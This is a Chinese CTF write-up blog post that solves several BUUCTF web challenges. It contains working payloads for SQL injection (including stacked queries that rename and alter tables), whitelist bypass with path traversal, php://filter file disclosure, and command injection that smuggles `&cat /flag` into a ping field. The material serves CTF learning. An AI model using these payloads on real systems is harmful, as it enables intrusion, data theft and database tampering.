<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>buuctf_web刷题记录_PART1 | 逃    避    現    實</title><meta name="keywords" content="CTF-Web"><meta name="author" content="1ustinianus"><meta name="copyright" content="1ustinianus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="我是菜鸡">
<meta property="og:type" content="article">
<meta property="og:title" content="buuctf_web刷题记录_PART1">
<meta property="og:url" content="http://gswanx.github.io/post/2e610037.html">
<meta property="og:site_name" content="逃    避    現    實">
<meta property="og:description" content="我是菜鸡">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://gswanx.github.io/img/headddd.jpg">
<meta property="article:published_time" content="2022-10-12T11:51:59.000Z">
<meta property="article:modified_time" content="2023-07-31T02:57:07.024Z">
<meta property="article:author" content="1ustinianus">
<meta property="article:tag" content="CTF-Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://gswanx.github.io/img/headddd.jpg"><link rel="shortcut icon" href="/img/17150526893.png"><link rel="canonical" href="http://gswanx.github.io/post/2e610037"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'buuctf_web刷题记录_PART1',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-07-31 10:57:07'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/universe.css"><link rel="stylesheet" href="/css/title.css"><link rel="stylesheet" href="//at.alicdn.com/t/c/font_3571753_hc60oskdsr8.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/headddd.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">12</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/754566.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">逃    避    現    實</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间线</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">buuctf_web刷题记录_PART1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-10-12T11:51:59.000Z" title="发表于 2022-10-12 19:51:59">2022-10-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-31T02:57:07.024Z" title="更新于 2023-07-31 10:57:07">2023-07-31</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web%E5%AE%89%E5%85%A8/">Web安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/Web%E5%AE%89%E5%85%A8/%E5%88%B7%E9%A2%98/">刷题</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">27.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>124分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="buuctf_web刷题记录_PART1"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>简单的SQL注入:</p>
<p>尝试在用户名栏输入<code>admin&#39;</code>提示SQL语句报错，说明存在注入漏洞</p>
<p>那么在用户名栏输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or &#x27;1&#x27;=&#x27;1&#x27; #</span><br></pre></td></tr></table></figure>

<p>这里<code>&#39;1&#39;=&#39;1&#39;</code>是一个恒真的条件, <code>#</code>使得后面的其他语句失效</p>
<p>密码随便输入一个,点击登录后就能够看到flag了</p>
<img src="/images/buuctf-web/image-20221012200717515-16670478197331.png" alt="image-20221012200717515" style="zoom:67%;" />

<br>

<hr>
<br>

<h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF_2018]WarmUp"></a>[HCTF_2018]WarmUp</h1><p>打开页面是一个滑稽脸,查看源码可以发现<code>source.php</code></p>
<p>访问这个文件,得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];<span class="comment">//白名单</span></span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>( //返回给定字符串的一部分,<span class="number">0</span>是起始位置,第三个参数是返回的长度</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//此函数返回问号在page中第一次出现的位置</span><br><span class="line">            );<span class="comment">// 此函数相当于截断了$_page中问号后面的部分</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            ); </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])&amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])&amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])) 	&#123; <span class="comment">// 要求参数file的值非空, 是字符串,且通过checkFile函数的检测</span></span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问一下代码里提示的另一个文件 <code>hint.php</code>, 提示flag在<code>ffffllllaaaagggg</code>中</p>
<img src="/images/buuctf-web/2.png" alt="2" style="zoom:67%;" />

<p>代码中,第8行的第一个<code>if</code>判断是否传入参数,以及参数值是否是字符串</p>
<p>12行第二个<code>if</code>直接判断参数值是否在白名单里,如果传<code>file=hint.php</code>这里将会直接判断为True,函数返回,并<code>include</code>参数值,但是这样无法读取到<code>ffffllllaaaagggg</code>中的内容</p>
<p>15-18行截断了参数值第一个问号前面的部分, 20行将对这部分进行判断,如果在白名单内,函数也会返回.</p>
<p>如果想让函数在这里返回,那么参数<code>file</code>的值应为: <code>hint.php?其他内容</code></p>
<blockquote>
<p><strong>知识点补充:</strong></p>
<p><strong>对于<code>include</code>函数来说,如果它的参数中含有路径,那么它会按照参数给出的路径去寻找文件,也就是会包含最后一个<code>/</code>后面的文件</strong></p>
<p><strong>例如<code>include(hint.php?../../abc.php)</code>即使<code>hint.php</code>存在,<code>include</code>函数也会去尝试寻找并包含最后面的<code>abc.php</code></strong></p>
</blockquote>
<p>因此,可以构造payload: 不知道<code>ffffllllaaaagggg</code>在哪个目录,依次尝试就行,最后成功的payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>这里<code>hint.php</code>保证能够通过检测, 最后执行的include为,也就成功包含了<code>ffffllllaaaagggg</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(hint.php?../../../../../ffffllllaaaagggg)</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221012223735123.png" alt="image-20221012223735123" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>很简单,查看源码就有提示</p>
<p>GET传一个<code>cat</code>参数,值为dog,flag就直接出来了</p>
<br>

<hr>
<br>

<h1 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h1><p>进来之后是一个链接,点击后发现使用GET中的<code>file</code>变量来包含了<code>flag.php</code></p>
<p>直接访问<code>flag.php</code>也是显示一样的内容: </p>
<img src="/images/buuctf-web/image-20221013151927649.png" alt="image-20221013151927649" style="zoom:67%;" />

<p>说明这里存在文件包含漏洞,那么可以利用<code>php</code>伪协议来输出一下<code>flag.php</code>的源码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>将输出内容进行<code>base64</code>解码之后就得到了flag:</p>
<img src="/images/buuctf-web/image-20221013152041727-16670478197333.png" alt="image-20221013152041727" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h1><p>这里输入一个地址,后台服务器会<code>ping</code>这个地址,那么后台应该是把这里输入的地址拼接到命令中,那么这里应该也可以利用<code>&amp;</code>或<code>&amp;&amp;</code>执行其他命令</p>
<p><img src="/images/buuctf-web/image-20221013153002942.png" alt="image-20221013153002942"></p>
<p>查看下根目录有什么文件:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;ls /</span><br></pre></td></tr></table></figure>

<p>要素察觉<img src="/images/buuctf-web/image-20221013153511483-16670478197332.png" alt="image-20221013153511483" style="zoom:67%;" /></p>
<p>接下来输出一下这个文件的内容就看到flag了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;cat  /flag</span><br></pre></td></tr></table></figure>

<br>

<hr>
<br>

<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from `1919810931114514`</span><br><span class="line">73656c656374202a2066726f6d20603139313938313039333131313435313460</span><br><span class="line"></span><br><span class="line">1&#x27;;Set@payload=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execpayload from @payload;execute execpayload;#</span><br></pre></td></tr></table></figure>

<p>首先测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>成功输出</p>
<p>接下来使用<code>union</code>来尝试获得数据库的一些信息:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2&#x27; union select version(),database() #</span><br></pre></td></tr></table></figure>

<p>发现存在关键词过滤:</p>
<img src="/images/buuctf-web/image-20221013154743257.png" alt="image-20221013154743257" style="zoom:67%;" />

<p>那么尝试使用不在黑名单里的<code>show</code>来爆库名,表名和列名:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show databases;#</span><br><span class="line">1&#x27;;show tables;#</span><br><span class="line">1&#x27;; show columns from words;#</span><br><span class="line">1&#x27;; show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221013155532680-16670478197334.png" alt="image-20221013155532680" style="zoom:67%;" />



<img src="/images/buuctf-web/image-20221013155832825.png" alt="image-20221013155832825" style="zoom:67%;" />

<blockquote>
<p><strong>知识点:</strong></p>
<p><strong>在表名为纯数字时,需要把表名用反引号包裹起来!!!!!</strong></p>
</blockquote>
<p>发现在名为<code>1919810931114514</code>的表中有一个名为flag的列,那么现在需要尝试获取这个列中的数据</p>
<p>下面是网上找到大佬使用的几种方法:</p>
<ul>
<li><strong>预处理查询语句</strong></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;Set@payload=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execpayload from @payload;execute execpayload;#</span><br><span class="line">//这里先将本来想要执行的select * from `1919810931114514`进行16进制编码</span><br><span class="line">//然后使用Set语句将编码后的语句赋值给一个变量: Set@变量名=变量值</span><br><span class="line">//使用prepare语句对查询语句进行预处理,这个过程里会进行编码转换:prepare 预处理后的变量名 from @变量名</span><br><span class="line">//最后执行预处理后的语句:execute 预处理后的变量名</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221013171514886-16670478197335.png" alt="image-20221013171514886" style="zoom:67%;" />

<br>

<ul>
<li><strong>使用<code>handler</code>语句</strong> 关于<code>handler</code>具体见<a href="94662ad7.html">这里</a></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;# </span><br><span class="line">//或者</span><br><span class="line">1&#x27;;HANDLER `1919810931114514` OPEN as a;HANDLER a READ FIRST;HANDLER a CLOSE;# </span><br><span class="line">//这里的逻辑是使用handler语句打开要查询的表,然后读取第一行数据后关闭</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>修改表名</strong></li>
</ul>
<p>通过前面的查询,库中一共有<code>word</code>和<code>1919810931114514</code>,<code>word</code>表中包含<code>id</code>和<code>data</code>两列,那么正常输入数字查询出的数据应该来自这个表,那么可以设法使正常查询显示<code>1919810931114514</code>这个表中的内容.</p>
<p>如果正常的查询语句为<code>select id,data from word where id=xxx</code>,那么只需要让此语句指向另一个表中需要的数据就行了</p>
<ol>
<li><p>通过<code>rename</code>修改<code>word</code>的表名:<code>rename table words to aaa;</code></p>
</li>
<li><p>将<code>1919810931114514</code>的表名修改为<code>word</code>:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">table</span> `<span class="number">1919810931114514</span>` <span class="keyword">to</span> words</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改该表中的列信息:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">add</span> id <span class="type">int</span> unsigned <span class="keyword">not</span> <span class="keyword">Null</span> auto_increment <span class="keyword">primary</span> key; <span class="keyword">alter</span> <span class="keyword">table</span> words change flag data <span class="type">varchar</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure></li>
</ol>
<p>那么完整的payload为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; rename table words to aaa; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>

<p>最后只要输入1就可以查询到flag了:</p>
<img src="/images/buuctf-web/image-20221013175155502-16670478197338.png" alt="image-20221013175155502" style="zoom:67%;" />



<br>

<hr>
<br>

<h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1 有显示</span><br><span class="line">1&#x27; 无显示</span><br><span class="line">1122 and 1=1 # --nonono</span><br><span class="line">asb and 1=1 # --nonono</span><br><span class="line">1122 or 1=1 # --nonono</span><br><span class="line">asb or 1=1 # --nonono</span><br><span class="line">1;show databases;# 成功</span><br><span class="line">1;show tables;# 成功</span><br><span class="line">1;show columns from Flag; --nonono</span><br><span class="line">1;Set@a=0x73686f7720636f6c756d6e732066726f6d20466c61673b;prepare b from @a;execute b;# --nonono</span><br><span class="line">1;HANDLER flag OPEN as a;HANDLER a READ FIRST;HANDLER a CLOSE;#  --nonono</span><br></pre></td></tr></table></figure>

<img src="/images/buuctf-web/image-20221013180118069-16670478197336.png" alt="image-20221013180118069" style="zoom:67%;" />

<img src="/images/buuctf-web/image-20221013184312188-16670478197337.png" alt="image-20221013184312188" style="zoom:67%;" />

<p>经过测试可知: 数字型参数, 存在关键词过滤, flag大概率在<code>Flag</code>表里,但<code>Flag</code>在黑名单里面无法通过过滤</p>
<p>用BurpSuite的<code>Intruder</code>做一下<code>fuzz</code>测试,看看哪些字符不在过滤范围内,这里长度为507的说明服务器返回了<code>nonono</code>,也就是这些词被过滤了</p>
<img src="/images/buuctf-web/image-20221013185406308-16670478197339.png" alt="image-20221013185406308" style="zoom:67%;" />



<p>通过测试, <code>#</code>,<code>;</code>等符号都还可以使用</p>
<p>另外发现,这里不管查询多大的数字,都会且仅会返回<code>Array ([0] =&gt;1)</code></p>
<p>根据<a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/108937396">https://blog.csdn.net/mochu7777777/article/details/108937396</a> 这里应该是进行了一次或运算</p>
<p>那么查询语句应该是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select &quot;.$post[&#x27;query&#x27;].&quot;||flag from Flag&quot;;</span><br></pre></td></tr></table></figure>

<p>用户提交的参数和flag进行了一次或运算后再执行查询,这样无论提交什么非0数字,实际上执行的查询就是:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> Flag;</span><br></pre></td></tr></table></figure>

<p>返回的结果自然为1</p>
<img src="/images/buuctf-web/image-20221013194904850.png" alt="image-20221013194904850" style="zoom:67%;" />



<p>那么payload设置为: <code>*,1</code>就可以查询到flag,这样实际执行的查询语句是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *,1 from Flag; </span><br></pre></td></tr></table></figure>

<p>另: 可以通过修改SQL配置,将<code>||</code>设置为连接符,当将<code>||</code>视为连接符之后,执行下面的语句将分别查询<code>1</code>和<code>flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1||flag from Flag; </span><br></pre></td></tr></table></figure>

<p>那么payload为:</p>
